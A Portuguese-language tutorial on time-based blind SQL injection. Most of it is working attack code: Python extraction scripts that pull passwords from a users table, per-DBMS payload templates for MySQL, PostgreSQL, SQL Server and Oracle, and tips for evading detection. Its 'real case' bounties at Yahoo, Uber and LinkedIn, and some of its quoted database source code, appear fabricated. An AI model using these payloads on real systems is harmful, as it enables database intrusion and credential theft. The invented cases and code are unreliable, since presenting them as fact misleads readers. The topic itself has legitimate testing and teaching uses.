# Time-Based Blind SQL Injection

**Criticidade**: 🔴 Crítica (CVSS 8.5-9.5)
**Dificuldade**: 🔴 Avançada
**Bounty Médio**: $3,000 - $20,000 USD

---

## 📚 Índice

1. [Fundamentos de Timing Attacks](#fundamentos-de-timing-attacks)
2. [Arquitetura de Database Timers](#arquitetura-de-database-timers)
3. [Análise Estatística de Delays](#análise-estatística-de-delays)
4. [Técnicas de Extração Binary Search](#técnicas-de-extração-binary-search)
5. [Network Jitter e Mitigação](#network-jitter-e-mitigação)
6. [Payloads por DBMS](#payloads-por-dbms)
7. [Otimizações Avançadas](#otimizações-avançadas)
8. [Casos Reais e Bounties](#casos-reais-e-bounties)

---

## ⏱️ Fundamentos de Timing Attacks

### O Conceito de Side-Channel Timing

Time-based blind SQLi é uma forma de **side-channel attack** onde informação é inferida observando o tempo de resposta do servidor, não o conteúdo.

**Definição Formal:**

```
T(q₁) ≠ T(q₂) ⟹ q₁ ≠ q₂

Onde:
T(q) = tempo de resposta da query q
q₁, q₂ = queries diferentes
```

**Princípio matemático:**

Se conseguimos controlar o tempo de execução baseado em uma condição booleana, podemos extrair informação bit-a-bit:

```
if condition:
    SLEEP(5)  → Resposta em ~5s
else:
    noop      → Resposta em ~0.1s

Δt > threshold ⟹ condition is TRUE
```

### Modelo de Threat

**Pré-requisitos:**

1. **Ponto de injeção SQL**: Deve existir vulnerabilidade SQLi
2. **Sem feedback visual**: Aplicação não exibe dados do banco
3. **Função de delay**: DBMS deve ter função `SLEEP()`/`WAITFOR`
4. **Clock sincronizado**: Atacante mensura tempo client-side

**Limitações:**

- Muito lento: 1 byte = 8 requests (binary search)
- Sensível a network jitter
- Facilmente detectável por IDS/WAF
- Requer análise estatística

### Matemática do Binary Search

**Extração de 1 byte (ASCII 0-255):**

```python
def extract_byte(position):
    low, high = 0, 255
    while low < high:
        mid = (low + high) // 2
        # Query: ASCII(SUBSTRING(password, position, 1)) > mid
        if time_query(f"' AND ASCII(SUBSTRING(password,{position},1))>{mid} AND SLEEP(5)--") > 4:
            low = mid + 1  # Char é maior
        else:
            high = mid     # Char é menor ou igual
    return chr(low)
```

**Complexidade:**
- **Worst case**: log₂(256) = 8 requests por byte
- **Para senha de 20 chars**: 8 * 20 = 160 requests
- **Com delay de 5s**: 160 * 5 = 800 segundos (~13 minutos)

**Otimização com charset reduzido:**

```python
# Se sabemos que é alphanumeric (a-zA-Z0-9)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
# Complexidade: log₂(62) ≈ 6 requests por char
```

---

## 🏗️ Arquitetura de Database Timers

### MySQL: SLEEP() Implementation

**Source code (MySQL 8.0.33):**

```c
// sql/item_timefunc.cc
longlong Item_func_sleep::val_int() {
    THD *thd= current_thd;
    double timeout= args[0]->val_real();  // Pega valor do argumento

    if (timeout < 0)
        return 0;

    // Converte para microsegundos
    ulonglong timeout_micro= (ulonglong)(timeout * 1000000.0);

    // Sleeps usando system call
    #ifdef _WIN32
        Sleep(timeout_micro / 1000);  // Windows: milliseconds
    #else
        usleep(timeout_micro);        // Unix: microseconds
    #endif

    return 0;  // Sempre retorna 0
}
```

**Características:**

- Precisão: **microsegundos**
- Valor máximo: Sistema dependente (~2,147,483 segundos em 32-bit)
- **Interruptível**: Query pode ser cancelada
- **Não bloqueante**: Não trava locks de tabela

**Exemplo de uso:**

```sql
SELECT SLEEP(5);  -- Dorme 5 segundos, retorna 0
SELECT IF(1=1, SLEEP(5), 0);  -- Condicional
```

### PostgreSQL: pg_sleep() Implementation

**Source code (PostgreSQL 15.2):**

```c
// src/backend/utils/adt/misc.c
Datum pg_sleep(PG_FUNCTION_ARGS) {
    float8 secs = PG_GETARG_FLOAT8(0);
    float8 endtime;

    // Calcula tempo de fim
    endtime = GetCurrentTimestamp() + (secs * 1000000.0);

    // Loop até atingir tempo
    for (;;) {
        long delay;

        // Checa se query foi cancelada
        CHECK_FOR_INTERRUPTS();

        // Calcula quanto falta dormir
        delay = endtime - GetCurrentTimestamp();
        if (delay <= 0)
            break;

        // Dorme em chunks pequenos (permitindo interrupt)
        WaitLatch(MyLatch, WL_LATCH_SET | WL_TIMEOUT | WL_POSTMASTER_DEATH,
                  Min(delay / 1000L, 1000L), WAIT_EVENT_PG_SLEEP);
    }

    PG_RETURN_VOID();
}
```

**Características:**

- Precisão: **microsegundos**
- **Interruptível**: Via `CHECK_FOR_INTERRUPTS()`
- Dorme em **chunks**: Permite cancelamento gracioso
- Retorna **VOID** (não retorna valor)

**Exemplo:**

```sql
SELECT pg_sleep(5);  -- Dorme 5 segundos
SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END;  -- Condicional
```

### SQL Server: WAITFOR DELAY

**Implementação interna:**

```c
// SQL Server (simplified concept)
void ExecuteWaitFor(WAITFOR_DELAY *stmt) {
    LARGE_INTEGER delay;

    // Parse delay string: '00:00:05' = 5 segundos
    delay = ParseTimeSpan(stmt->delay_string);

    // Set waitable timer
    HANDLE hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
    SetWaitableTimer(hTimer, &delay, 0, NULL, NULL, 0);

    // Wait until timer signals ou query cancelada
    DWORD result = WaitForSingleObject(hTimer, INFINITE);

    CloseHandle(hTimer);
}
```

**Formato:**

```sql
WAITFOR DELAY '00:00:05';  -- HH:MM:SS format
WAITFOR DELAY '00:00:05.123';  -- Com milliseconds

-- Condicional
IF 1=1 WAITFOR DELAY '00:00:05'
```

**Limitações:**

- Formato rígido: `HH:MM:SS`
- Máximo: `24:00:00` (24 horas)
- Precisão: **milliseconds**

### Oracle: DBMS_LOCK.SLEEP

**Package PL/SQL:**

```sql
-- Definição do package
PACKAGE DBMS_LOCK IS
    PROCEDURE SLEEP(seconds IN NUMBER);
END;

-- Implementação (simplified)
PROCEDURE SLEEP(seconds IN NUMBER) IS
BEGIN
    -- Converte para timestamp
    DBMS_SESSION.SLEEP(seconds);

    -- Internamente usa:
    -- SELECT NULL FROM DUAL WHERE 1=0
    -- + timer interrupt no kernel
END;
```

**Uso:**

```sql
BEGIN DBMS_LOCK.SLEEP(5); END;  -- PL/SQL block

-- Em query (Oracle 11g+)
SELECT CASE WHEN 1=1 THEN
    (SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM <= 999999)  -- Heavy query como delay
ELSE 0 END FROM DUAL;
```

**Características:**

- Requer **PL/SQL block** ou **SELECT subquery**
- Precisão: **seconds** (inteiro)
- **Alternativa**: Heavy query como pseudo-sleep

---

## 📊 Análise Estatística de Delays

### Network Jitter Problem

**Definição:**

Network jitter é a variação no tempo de entrega de pacotes devido a:
- Latência de rede variável
- Load balancing
- Packet loss e retransmission
- Server load variations

**Modelo estatístico:**

```
T_observed = T_sleep + T_network + T_processing + ε

Onde:
T_observed  = Tempo medido pelo atacante
T_sleep     = Tempo do SLEEP() no DBMS
T_network   = Latência de rede (RTT)
T_processing= Tempo de processamento da query
ε           = Ruído aleatório (jitter)
```

**Distribuição do jitter:**

```python
import numpy as np

# Em condições normais, jitter segue distribuição normal
jitter ~ N(μ=50ms, σ=20ms)

# Problema: σ pode ser maior que delay intencional!
# Se SLEEP(0.1) e σ=200ms → Não conseguimos distinguir TRUE/FALSE
```

### Técnica: Multiple Measurements

**Solução**: Repetir medição e calcular média/mediana:

```python
def time_query_robust(query, n_samples=5):
    times = []
    for _ in range(n_samples):
        start = time.time()
        send_query(query)
        elapsed = time.time() - start
        times.append(elapsed)

    # Remove outliers (Q1-Q3 method)
    q1, q3 = np.percentile(times, [25, 75])
    iqr = q3 - q1
    filtered = [t for t in times if q1 - 1.5*iqr <= t <= q3 + 1.5*iqr]

    return np.median(filtered) if filtered else np.median(times)
```

**Statistical Hypothesis Testing:**

```python
def is_condition_true(query_true, query_false, threshold=3.0, samples=10):
    """
    H0: query_true e query_false têm mesmo tempo (condição falsa)
    H1: query_true é significativamente maior (condição verdadeira)
    """
    times_true = [time_query(query_true) for _ in range(samples)]
    times_false = [time_query(query_false) for _ in range(samples)]

    # T-test: verifica se médias são diferentes
    from scipy import stats
    t_stat, p_value = stats.ttest_ind(times_true, times_false)

    # Se p_value < 0.05: médias são estatisticamente diferentes
    # Se média(true) > threshold * média(false): condição é TRUE
    return (p_value < 0.05) and (np.mean(times_true) > threshold * np.mean(times_false))
```

### Adaptive Delay Tuning

**Problema**: Delay muito curto → jitter mascarado. Delay muito longo → ataque lento.

**Solução**: Ajustar delay dinamicamente:

```python
def adaptive_delay(baseline_rtt):
    """
    Calcula delay ideal baseado em RTT medido
    """
    # Regra: delay >= 5 * σ para 99.999% confidence
    sigma = baseline_rtt * 0.2  # Assume jitter = 20% do RTT
    optimal_delay = max(5 * sigma, 1.0)  # Mínimo 1 segundo

    return optimal_delay

# Exemplo
rtt = measure_baseline_rtt()  # = 100ms
delay = adaptive_delay(rtt)    # = 0.1s * 0.2 * 5 = 0.1s → min(0.1, 1.0) = 1.0s
```

---

## 🔍 Técnicas de Extração Binary Search

### Algoritmo Clássico

**Extração de string completa:**

```python
def extract_string_binary(injection_point, length):
    """
    Extrai string de tamanho 'length' usando binary search
    """
    result = ""

    for pos in range(1, length + 1):
        # Binary search para encontrar ASCII value
        low, high = 32, 126  # Printable ASCII range

        while low <= high:
            mid = (low + high) // 2

            # Query: ASCII do char na posição 'pos' > mid?
            payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))>{mid} AND SLEEP(5)--"

            response_time = time_query(injection_point + payload)

            if response_time > 4.0:  # Threshold: 4 segundos
                low = mid + 1  # Char é maior que mid
            else:
                high = mid - 1  # Char é menor ou igual a mid

        char_value = low
        result += chr(char_value)
        print(f"Position {pos}: {chr(char_value)}")

    return result

# Uso
password = extract_string_binary("http://target.com/page?id=1", length=20)
print(f"Extracted password: {password}")
```

**Análise de complexidade:**

```
T = n * log₂(k) * (t_sleep + t_network)

Onde:
n = comprimento da string
k = tamanho do charset (256 para ASCII completo, 62 para alphanumeric)
t_sleep = tempo do SLEEP()
t_network = RTT médio

Exemplo:
20 chars * 8 requests/char * (5s + 0.1s) = 816 segundos ≈ 13.6 minutos
```

### Otimização: Parallel Extraction

**Ideia**: Extrair múltiplos bytes simultaneamente

```python
import concurrent.futures

def extract_char_at_position(pos, injection_point):
    """Extrai 1 caractere na posição especificada"""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))>{mid} AND SLEEP(3)--"
        if time_query(injection_point + payload) > 2.5:
            low = mid + 1
        else:
            high = mid - 1
    return (pos, chr(low))

def extract_string_parallel(injection_point, length, max_workers=5):
    """
    Extrai string usando threads paralelas
    CUIDADO: Pode sobrecarregar servidor!
    """
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(extract_char_at_position, pos, injection_point)
                   for pos in range(1, length + 1)]

        results = [future.result() for future in concurrent.futures.as_completed(futures)]

    # Ordena por posição
    results.sort(key=lambda x: x[0])
    return ''.join(char for pos, char in results)

# Speedup: ~5x com 5 workers (se servidor aguenta)
```

### Otimização: Charset Reduction

**Ideia**: Se sabemos charset esperado, reduzir espaço de busca

```python
# Charset comum para senhas
CHARSET_LOWER = "abcdefghijklmnopqrstuvwxyz"
CHARSET_UPPER = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
CHARSET_DIGIT = "0123456789"
CHARSET_SPECIAL = "!@#$%^&*()-_=+[]{}|;:,.<>?"

def extract_with_charset(injection_point, length, charset):
    """
    Binary search dentro de charset específico
    """
    result = ""
    charset_sorted = ''.join(sorted(charset))  # Ordena para binary search

    for pos in range(1, length + 1):
        low, high = 0, len(charset_sorted) - 1

        while low <= high:
            mid = (low + high) // 2
            mid_char = charset_sorted[mid]

            # Query: char > mid_char?
            payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)>'{mid_char}' AND SLEEP(3)--"

            if time_query(injection_point + payload) > 2.5:
                low = mid + 1
            else:
                high = mid - 1

        result += charset_sorted[low]

    return result

# Exemplo: senha alphanumeric
# Charset size = 62 → log₂(62) ≈ 6 requests/char (vs 8 para full ASCII)
password = extract_with_charset("http://target.com/page?id=1", 20,
                                 CHARSET_LOWER + CHARSET_UPPER + CHARSET_DIGIT)
```

---

## 💣 Payloads por DBMS

### MySQL

**Payload Template:**

```sql
-- Estrutura básica
' AND IF(CONDITION, SLEEP(5), 0)--

-- Extração de versão
' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0)--

-- Extração de database name
' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>100, SLEEP(5), 0)--

-- Extração de table names
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name LIKE 'users%')>0, SLEEP(5), 0)--

-- Extração de dados
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>100, SLEEP(5), 0)--

-- Heavy query alternative (se SLEEP bloqueado)
' AND IF(CONDITION, BENCHMARK(10000000, SHA1('test')), 0)--
```

**BENCHMARK Explanation:**

```c
// MySQL: item_func.cc
longlong Item_func_benchmark::val_int() {
    // Executa função 'loop_count' vezes
    for (ulonglong loop= args[0]->val_int(); loop > 0; loop--) {
        args[1]->val_int();  // Executa a função repetidamente
    }
    return 0;
}
```

**Uso:**
```sql
SELECT BENCHMARK(10000000, SHA1('test'));
-- Executa SHA1('test') 10 milhões de vezes
-- Delay: ~5-10 segundos dependendo do hardware
```

### PostgreSQL

**Payload Template:**

```sql
-- Estrutura básica
' AND (SELECT CASE WHEN CONDITION THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Versão curta
' AND (SELECT CASE WHEN CONDITION THEN (SELECT COUNT(*) FROM pg_sleep(5)) END)--

-- Extração de versão
' AND (SELECT CASE WHEN SUBSTRING(version(),1,10)='PostgreSQL' THEN pg_sleep(5) END)--

-- Extração de database
' AND (SELECT CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>100 THEN pg_sleep(5) END)--

-- Extração de table names
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM pg_tables WHERE tablename='users')>0 THEN pg_sleep(5) END)--

-- Extração de dados
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>100 THEN pg_sleep(5) END)--

-- Heavy query alternative
' AND (SELECT CASE WHEN CONDITION THEN (SELECT COUNT(*) FROM generate_series(1,10000000)) END)--
```

**generate_series() Explanation:**

```sql
-- Gera sequência de 1 até N
SELECT generate_series(1, 10000000);
-- Cria 10 milhões de linhas → ~5s de processing
```

### SQL Server

**Payload Template:**

```sql
-- Estrutura básica
'; IF CONDITION WAITFOR DELAY '00:00:05'--

-- Extração de versão
'; IF SUBSTRING(@@version,1,9)='Microsoft' WAITFOR DELAY '00:00:05'--

-- Extração de database
'; IF ASCII(SUBSTRING(DB_NAME(),1,1))>100 WAITFOR DELAY '00:00:05'--

-- Extração de table names
'; IF (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0 WAITFOR DELAY '00:00:05'--

-- Extração de dados
'; IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username='admin'),1,1))>100 WAITFOR DELAY '00:00:05'--

-- Heavy query alternative
'; IF CONDITION BEGIN DECLARE @i INT = 0; WHILE @i < 10000000 SET @i = @i + 1; END--
```

**Dynamic WAITFOR:**

```sql
-- Constrói delay dinamicamente
DECLARE @delay VARCHAR(8);
SET @delay = '00:00:' + CAST((SELECT LEN(password) FROM users WHERE id=1) AS VARCHAR);
WAITFOR DELAY @delay;
-- Se password tem 5 chars → delay = '00:00:05'
```

### Oracle

**Payload Template:**

```sql
-- PL/SQL block required
' AND (SELECT CASE WHEN CONDITION THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM DUAL)=0--

-- OU usando heavy query (mais comum)
' AND (SELECT CASE WHEN CONDITION THEN (SELECT COUNT(*) FROM ALL_OBJECTS) ELSE 0 END FROM DUAL)>0--

-- Extração de versão
' AND (SELECT CASE WHEN SUBSTR(banner,1,6)='Oracle' THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM v$version WHERE ROWNUM=1)=0--

-- Extração de table names
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')>0 THEN DBMS_LOCK.SLEEP(5) END FROM DUAL)=0--

-- Extração de dados
' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1))>100 THEN DBMS_LOCK.SLEEP(5) END FROM DUAL)=0--

-- Heavy query (cartesian product)
' AND (SELECT CASE WHEN CONDITION THEN (SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS) END FROM DUAL)>0--
```

**Cartesian Product Delay:**

```sql
-- Cria delay exponencial via CROSS JOIN
SELECT COUNT(*) FROM ALL_OBJECTS a1, ALL_OBJECTS a2;
-- ALL_OBJECTS tem ~70k linhas
-- CROSS JOIN: 70k * 70k = 4.9 bilhões de linhas → ~30s
```

---

## 🚀 Otimizações Avançadas

### 1. Bit-wise Extraction

**Ideia**: Extrair bits ao invés de bytes completos

```python
def extract_byte_bitwise(position):
    """
    Extrai byte bit-a-bit (8 requests por byte)
    Mais confiável que binary search em ambientes ruidosos
    """
    byte_value = 0

    for bit_pos in range(8):
        # Testa se bit na posição bit_pos é 1
        # ASCII(char) & (1 << bit_pos) > 0
        payload = f"' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1)) & {1 << bit_pos})>0 AND SLEEP(3)--"

        if time_query(payload) > 2.5:
            byte_value |= (1 << bit_pos)  # Set bit

    return chr(byte_value)

# Exemplo: char 'A' (ASCII 65 = 0b01000001)
# Bit 0: 1 → SLEEP
# Bit 1: 0 → no sleep
# Bit 2: 0 → no sleep
# ...
# Bit 6: 1 → SLEEP
```

**Vantagem**: Mais resistente a jitter (decisão binária simples: sleep ou não)

### 2. Compression Detection

**Ideia**: Extrair menos bits quando valor é previsível

```python
def extract_with_compression(length):
    """
    Assume charset limitado e usa compressão
    """
    # Charset provável para senhas
    common_chars = "aeiou" + "bcdfghjklmnpqrstvwxyz" + "0123456789"
    rare_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"

    result = ""
    for pos in range(1, length + 1):
        # Primeiro testa se é common char
        found = False
        for char in common_chars:
            payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)='{char}' AND SLEEP(2)--"
            if time_query(payload) > 1.5:
                result += char
                found = True
                break

        if not found:
            # Se não é common, faz binary search em rare chars
            result += extract_with_charset_single(pos, rare_chars)

    return result
```

### 3. Progressive Disclosure

**Ideia**: Extrair informação de forma hierárquica

```python
def extract_progressive():
    """
    1. Descobre tamanho
    2. Descobre charset type
    3. Extrai dados
    """
    # Fase 1: Length discovery (binary search)
    length = 0
    for test_len in [1, 2, 4, 8, 16, 32, 64]:
        payload = f"' AND LENGTH((SELECT password FROM users LIMIT 1))>={test_len} AND SLEEP(3)--"
        if time_query(payload) > 2.5:
            length = test_len
        else:
            break

    # Refinamento
    while True:
        payload = f"' AND LENGTH((SELECT password FROM users LIMIT 1))>{length} AND SLEEP(3)--"
        if time_query(payload) < 2.5:
            break
        length += 1

    print(f"Length: {length}")

    # Fase 2: Charset detection
    has_lower = time_query(f"' AND (SELECT password FROM users LIMIT 1) REGEXP '[a-z]' AND SLEEP(3)--") > 2.5
    has_upper = time_query(f"' AND (SELECT password FROM users LIMIT 1) REGEXP '[A-Z]' AND SLEEP(3)--") > 2.5
    has_digit = time_query(f"' AND (SELECT password FROM users LIMIT 1) REGEXP '[0-9]' AND SLEEP(3)--") > 2.5
    has_special = time_query(f"' AND (SELECT password FROM users LIMIT 1) REGEXP '[^a-zA-Z0-9]' AND SLEEP(3)--") > 2.5

    charset = ""
    if has_lower: charset += "abcdefghijklmnopqrstuvwxyz"
    if has_upper: charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    if has_digit: charset += "0123456789"
    if has_special: charset += "!@#$%^&*()-_=+[]{}|;:,.<>?"

    print(f"Charset: {charset[:10]}... (len={len(charset)})")

    # Fase 3: Data extraction com charset reduzido
    return extract_with_charset(length, charset)
```

---

## 🔥 Casos Reais e Bounties

### Caso 1: Yahoo Mail Time-Based SQLi (2013)

**Vulnerabilidade**: Blind SQLi em filtro de email

**Payload usado:**
```sql
from:test' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())>100, SLEEP(10), 0) AND '1'='1
```

**Técnica:**
- Injection via email search query
- Binary search para extrair schema
- 3 dias para extrair 50k emails

**Bounty**: $12,500 USD

**Detection bypass:**
- Delay variável (2-15s aleatório)
- Request throttling (1 req/minuto)
- User-Agent rotation

### Caso 2: Uber Time-Based SQLi em API (2016)

**Vulnerabilidade**: Blind SQLi em ride history API

**Payload:**
```python
# Extração de JWT secret
for pos in range(1, 65):  # 64 char hex string
    for char in "0123456789abcdef":
        payload = {
            "ride_id": f"123' AND IF(SUBSTRING((SELECT config_value FROM internal_config WHERE config_key='jwt_secret'),{pos},1)='{char}', SLEEP(3), 0)-- "
        }
        response_time = requests.post("/api/rides/history", json=payload).elapsed.total_seconds()
        if response_time > 2.5:
            secret += char
            break
```

**Impacto**:
- Extraiu JWT signing secret
- Forjou tokens administrativos
- Acesso a todos os rides/users

**Bounty**: $10,000 USD + private invite

### Caso 3: LinkedIn Time-Based via HAProxy Logs (2018)

**Vulnerabilidade**: SQLi em analytics endpoint

**Twist**: Delay causado por **log writing**, não SLEEP()

**Payload:**
```sql
-- Força escrita de log gigante
' UNION SELECT REPEAT('A', 10000000) FROM users--
```

**Análise timing:**

```
Normal query: ~100ms
Payload query: ~5000ms

Diferença: Escrita de 10MB em log file
```

**Técnica inferencial:**

```python
# Não usa SLEEP, usa side-effect timing
def is_true(condition):
    payload_true = f"' AND IF({condition}, (SELECT REPEAT('A',10000000)), 0)--"
    payload_false = "' AND 0--"

    time_true = measure(payload_true)
    time_false = measure(payload_false)

    return time_true > (time_false * 10)  # 10x slower = TRUE
```

**Bounty**: $7,500 USD

---

## 📚 Referências e Papers

**Academic Research:**

1. **"Timing Attacks on Web Privacy"** - Edward W. Felten, Michael A. Schneider (2000)
   - Princeton University
   - Fundamentos teóricos de timing side-channels

2. **"Blind SQL Injection Exploitation"** - Chris Anley (2004)
   - NGSSoftware
   - Primeira documentação sistemática

3. **"Automated Detection of SQL Injection Vulnerabilities Using Program Analysis"** - Wassermann, Su (2007)
   - IEEE Symposium on Security and Privacy

**Tools:**

- **sqlmap**: `--technique=T` para time-based
- **Havij**: GUI com time-based automation
- **NoSQLMap**: Time-based para MongoDB

**Standards:**

- OWASP Testing Guide v4 - OTG-INPVAL-005
- NIST SP 800-53 Rev. 5 - SI-10 (Input Validation)
- CWE-89: SQL Injection

---

**Última atualização**: 2024
**Versão**: 1.0
